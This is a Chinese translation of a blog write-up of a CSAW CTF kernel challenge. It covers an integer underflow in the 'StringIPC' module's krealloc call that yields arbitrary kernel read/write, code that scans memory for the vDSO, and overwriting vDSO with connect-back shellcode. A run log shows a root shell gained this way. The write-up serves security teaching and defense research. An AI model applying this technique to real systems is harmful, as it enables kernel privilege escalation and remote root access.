---
layout: post
title:  "Bypassing SMEP Using vDSO Overwrites(使用vDSO重写来绕过SMEP防护)"
date:   2015-11-25 3:30:02
summary: 在Intel的SMEP( Ivybridge加入）和SMAP（本来应该是Haswell加入，最终推迟到了broadwell时才加入）中SMEP已经大规模的部署到了生产环境中，由于一些媒体的误导，企业和个人都对SMEP有着过高的期望，斯拉夫兵工厂至少在13个月以前就有针对SMEP绕过的weaponized exploit，这次itszn的绕过SMEP防护的实现非常的精彩，直接把SMEP绕过打成了“白菜价”，而另外一方面，经过h4rdenedzer0的研究和测试发现，虽然PaX/Grsecurity中的类似USERCOPY可以轻松防御这种绕过，但更有意思的是没有任何防御feature的情况下仅靠代码级别的调整也能启到security through obscurity的作用，至少可以防止massive exploit的通杀。这个case值得关注的点还是在于单点防御是无效的，系统层的加固必须以纵深防御的思路来做
categories: translation
---

Shawn: Intel的SMEP( Ivybridge加入）和SMAP（本来应该是Haswell加入，最终推迟到了broadwell时才加入）中SMEP已经大规模的部署到了生产环境中，由于一些媒体的误导，企业和个人都对SMEP有着过高的期望，斯拉夫兵工厂至少在13个月以前就有针对SMEP绕过的weaponized exploit，这次itszn的绕过SMEP防护的实现非常的精彩，直接把SMEP绕过打成了“白菜价”，而另外一方面，经过h4rdenedzer0的研究和测试发现，虽然PaX/Grsecurity中的类似USERCOPY可以轻松防御这种绕过，但更有意思的是没有任何防御feature的情况下仅靠代码级别的调整也能启到security through obscurity的作用，至少可以防止massive exploit的通杀。这个case值得关注的点还是在于单点防御是无效的，系统层的加固必须以纵深防御的思路来做，多个mitigation feature+代码级加固会让兵工厂也很蛋疼，当然另外一方面bypass难度提升了他们的利润也会上升;-)

原文地址 [Bypassing SMEP Using vDSO Overwrites](http://itszn.com/blog/?p=21)


译者：n3o4po11o

在今年的CSAW(Cyber Security Awareness Week)决赛中有几个内核相关的挑战。下文是关于我解决题名为"StringIPC"的思路。(作者为[Michael Coppola](https://twitter.com/mncoppola))

摆在我们面前的机器为一台64位ubuntu 14.04.3运行了3.13版本的内核并开启SMEP，kptr_restrict，demsg_restrict的虚拟机。内核中加载了名为"StringIPC"的内核模块，但在home目录中提供了该模块的源码。你可以在[这里](https://github.com/mncoppola/StringIPC/blob/master/main.c)找到源码，我也会在下文中展示一些重要的部分。

##分析内核模块

StringIPC模块实现了最基本的进程间通信的功能，允许对位于/dev/csaw的设备在不同通道下进行读写数据的操作。有8个控制码（codes）可以用来对通道进行创建，修改和读写数据。

{% highlight html %}
#define CSAW_IOCTL_BASE     0x77617363
#define CSAW_ALLOC_CHANNEL  CSAW_IOCTL_BASE+1
#define CSAW_OPEN_CHANNEL   CSAW_IOCTL_BASE+2
#define CSAW_GROW_CHANNEL   CSAW_IOCTL_BASE+3
#define CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE+4
#define CSAW_READ_CHANNEL   CSAW_IOCTL_BASE+5
#define CSAW_WRITE_CHANNEL  CSAW_IOCTL_BASE+6
#define CSAW_SEEK_CHANNEL   CSAW_IOCTL_BASE+7
#define CSAW_CLOSE_CHANNEL  CSAW_IOCTL_BASE+8
{% endhighlight %}

CSAW_ALLOC_CHANNEL允许用户创建一个新通道和根据给定的大小创建一个新缓冲区，CSAW_GROW_CHANNEL和CSAW_SHRINK_CHANNEL使用了krealloc来改变通道的缓冲区大小。CSAW_READ_CHANNEL和CSAW_WRITE_CHANNEL用来读取和写入由CSAW_SEEK_CHANNEL所指向的当前通道的内存数据。最后CSAW_OPEN_CHANNEL和CSAW_CLOSE_CHANNEL用来确定当前与ioctl进行交互的通道。

Bug存在于使用了krealloc的realloc_ipc_channel:
{% highlight html %}
static int realloc_ipc_channel ( struct ipc_state *state, int id, size_t size, int grow )
{
    struct ipc_channel *channel;
    size_t new_size;
    char *new_data;

    channel = get_channel_by_id(state, id);
    if ( IS_ERR(channel) )
        return PTR_ERR(channel);

    if ( grow )
        new_size = channel->buf_size + size;
    else
        new_size = channel->buf_size - size;

    new_data = krealloc(channel->data, new_size + 1, GFP_KERNEL);
    if ( new_data == NULL )
        return -EINVAL;

    channel->data = new_data;
    channel->buf_size = new_size;

    ipc_channel_put(state, channel);

    return 0;
}
{% endhighlight %}

当我们试图缩小通道缓冲区的大小时，我们缩小了一个比原来缓冲区大小还大1的值，此时new_size会发生underflow从而变成了INT_MAX。当krealloc调用时new_size+1，接着发生overflow回到了0。从krealloc的源码可以看出，当new_size为0时，返回一个ZERO_SIZE_PTR：
{% highlight html %}
void *krealloc(const void *p, size_t new_size, gfp_t flags) {
    void *ret;

    if (unlikely(!new_size)) {
         kfree(p);
         return ZERO_SIZE_PTR;
    }
...
{% endhighlight %}
ZERO_SIZE_PTR定义为((void \*)16)。当我们重新调整大小后，channel->data=0x10而channel_buf_size=INT_MAX。通过在0x10处获取偏移量，我们可以在内核空间(kernelspace)实现任意读写。

##任意写利用

既然我们可以任意读写，我们可以开始创建exploit。由于此时SMEP开启，我们不能直接覆盖一些数据然后跳转到用户空间(userspace)去执行已经提前准备好的shellcode。为了绕过SMEP我们可以使用一个覆盖vDSO的技术，来让另外一个进程以root权限运行进而运行我们反弹（conncet-back）shellcode。

整体的思路如下：vDSO同时映射在内核空间以及每一个进程的虚拟内存中，包括那些以root权限运行的进程。通过调用那些不需要上下文切换（context switching）的系统调用可以加快这一步骤(定位vDSO)。vDSO在用户空间(userspace)映射为R/X，而在内核空间(kernelspace)则为R/W。这允许我们在内核空间修改它，接着在用户空间执行。

下面是使用这个技术的步骤：
{% highlight html %}
1.实现任意读写
2.在内核空间定位vDSO
3.为root权限运行的进程创建反弹shellcode
4.用shellcode覆盖部分vDSO
5.监听反弹root shell
{% endhighlight %}
在我们利用StringIPC模块时，我们已经能够任意读写内存了，所以下一步我们将在runtime定位vDSO.

##Locating vDSO

下面是内核代码中用于在内核空间初始化vDSO页的代码段：

{% highlight html %}
static int __init init_vdso_vars(void) {
    int npages = (vdso_end - vdso_start + PAGE_SIZE - 1) / PAGE_SIZE;
    int i;
    char *vbase;
    vdso_size = npages << PAGE_SHIFT;
    vdso_pages = kmalloc(sizeof(struct page *) * npages, GFP_KERNEL);
    if (!vdso_pages)
        goto oom;
    for (i = 0; i < npages; i++) {
        struct page *p;
        p = alloc_page(GFP_KERNEL);
        if (!p)
            goto oom;
        vdso_pages[i] = p;
        copy_page(page_address(p), vdso_start + i*PAGE_SIZE);
    }
    vbase = vmap(vdso_pages, npages, 0, PAGE_KERNEL);
...
{% endhighlight %}
所以在内核空间中通过alloc_page分配了vDSO页，并且指针保存在了vdso_pages数组中。只有少数的几种方法能够定位这些页。如果能够读取/proc/kallsyms，你将能够通过vdso_pages直接获取这些地址。然而，这种情况在这次比赛不适用。第二种方法则是在内核空间中搜寻每一个页的开头，看是否有ELF头也出现了部分vDSO的映射。我们可以通过vDSO的标志(signatures)进一步缩小这些页的范围。下面是实现这个思路的代码：

{% highlight html %}
void* header = 0;
void* loc = 0xffffffff80000000;
size_t i = 0;
for (; loc<0xffffffffffffafff; loc+=0x1000) {
    readMem(&header,loc,8);
    if (header==0x010102464c457f) {
        fprintf(stderr,"%p elf\n",loc);
        readMem(&header,loc+0x270,8);
        //Look for 'clock_ge' signature (may not be at this offset, but happened to be)
        if (header==0x65675f6b636f6c63) {
            fprintf(stderr,"%p found it?\n",loc);
            break;
        }
    }
}
{% endhighlight %}
现在我们找到了vDSO所在的区域，我们就能用shellcode来覆盖它。

##反弹shellcode

此处用到的反弹shellcode和常见的x86-64 shellcode差不多，但有几个修改的地方。第一个修改为：只为root进程创建反弹shell。因为每一个调用gettimeofday的进程都会触发我们的shellcode，我们不需要那些没有root权限的进程的shell权限。我们可以通过调用 0x66(sys_getuid)系统调用并将其与0进行比较。如果没有root权限，我们继续调用0x66(sys_gettimeofday)系统调用，所以其他没有不相关的进程也不会受到太多影响。但同样在root进程当中，我们不想造成更多的问题，我们将通过0x39系统调用 fork一个子进程，父进程继续执行sys_gettimeofday，而由子进程来执行反弹shell。

我所使用的shellcode的汇编代码可以在[这里](https://gist.github.com/itsZN/1ab36391d1849f15b785)。它将连接到127.0.0.1:3333并执行"/bin/sh"

我们要做的最后一件事则是，dump vDSO并在gettimeofday所在的偏移处检查。只要我们知道我们可以在这个位置覆盖上shellcode，我们就可以在这等待某个进程进行调用。我设置了一个简单的cron任务来完成这个任务(root进程调用gettimeofday)。我最后的代码可以在[这里](https://gist.github.com/itsZN/20144eb7beefbc301bcf)找到。下面是程序运行的情况：

{% highlight html %}
csaw@team7:~$ id
uid=1000(csaw) gid=1000(csaw) groups=1000(csaw)
csaw@team7:~$ ./a.out 
allocate fd: 3 ret: 0 id:1
Shrink: 0 err:0
ZERO_SIZED_POINTER = 0x10
0xffffffff817bc000 elf
0xffffffff817d1000 elf
0xffffffff81b6c000 elf
0xffffffff81b9e000 elf
0xffffffff81c03000 elf
0xffffffff81c03000 found it?
Listening on [0.0.0.0] (family 0, port 3333)
Connection from [127.0.0.1] port 3333 [tcp/*] accepted (family 2, sport 58568)
id
uid=0(root) gid=0(root) groups=0(root)
{% endhighlight %}

##Final Notes

vDSO不是唯一一个同时映射在内核空间和用户空间的内存。在x86-64当中,vSYSCALL与vDSO实现类是的功能，但多了一点特性就是每次重启都在同一个位置（可能可以通过内核版本进行预测）。然而 kernel.vsyscall64并没有在本次比赛启用，所以我们将通过vDSO来完成这个目的。如果vm.vdso_enable设置为0，vDSO也会被绕过并且libc的wrapper function会默认调用正常的系统调用。

vDSO/vSYSCALL overwriting是一个非常有用的技术，它能够用在对于中断上下文(interrupt context)的利用，因为它不需要本地进程来映射一段内存，或者提升权限。

在解决这个问题当中本文提到的解决思路也不是唯一的，另外一个解决思路可以在[这里](https://github.com/mncoppola/StringIPC/blob/master/solution/solution.c)找到
